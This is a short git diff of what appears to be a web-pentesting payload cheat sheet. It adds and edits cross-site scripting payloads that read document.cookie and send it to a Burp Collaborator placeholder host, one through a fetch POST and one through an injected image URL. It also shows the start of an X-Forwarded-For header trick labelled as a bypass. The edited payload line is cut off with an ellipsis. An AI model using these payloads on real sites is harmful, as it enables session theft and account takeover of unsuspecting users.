@@ -1141,10 +1141,10 @@ python3 -m http.server -m 80
 </script> <script>fetch('https://<Collaborator>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>//
 ```
 
+XSS payload to steal cookies 🍪
 ```
-"><script>document.write(%27<img%20src="your.burpcollaborator.net/);</script>
+"><script>document.write(%27<img%20src="your.burpcollaborator.net/?c=%27%2bdocum…"%20/>%27);</script>
 ```
--
 >bypass add
 ```
 X-Forwarded-For: 1.1.1.1
